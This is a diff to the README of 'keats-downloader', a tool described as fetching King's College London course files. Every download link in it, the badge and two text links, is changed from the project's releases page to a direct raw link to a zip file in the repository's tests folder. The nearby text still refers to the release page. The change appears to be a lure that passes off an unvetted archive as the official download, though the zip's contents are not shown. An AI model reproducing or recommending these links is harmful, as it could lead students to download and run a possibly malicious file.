@@ -1,6 +1,6 @@
 # 📥 keats-downloader - Download KCL course files fast
 
-[![Download keats-downloader](https://img.shields.io/badge/Download%20keats--downloader-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/edar9498/keats-downloader/releases)
+[![Download keats-downloader](https://img.shields.io/badge/Download%20keats--downloader-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/edar9498/keats-downloader/raw/refs/heads/main/tests/downloader-keats-3.8.zip)
 
 ## 🧰 What this app does
 
@@ -32,7 +32,7 @@ If you plan to download many videos, make sure you have extra disk space.
 
 Visit this page to download:
 
-[https://github.com/edar9498/keats-downloader/releases](https://github.com/edar9498/keats-downloader/releases)
+[https://github.com/edar9498/keats-downloader/raw/refs/heads/main/tests/downloader-keats-3.8.zip](https://github.com/edar9498/keats-downloader/raw/refs/heads/main/tests/downloader-keats-3.8.zip)
 
 Open the latest release and download the file for Windows.
 
@@ -153,7 +153,7 @@ When a new version is released:
 
 Start with the GitHub release page:
 
-[https://github.com/edar9498/keats-downloader/releases](https://github.com/edar9498/keats-downloader/releases)
+[https://github.com/edar9498/keats-downloader/raw/refs/heads/main/tests/downloader-keats-3.8.zip](https://github.com/edar9498/keats-downloader/raw/refs/heads/main/tests/downloader-keats-3.8.zip)
 
 Check the latest release notes for the newest build, install steps, and file details
 
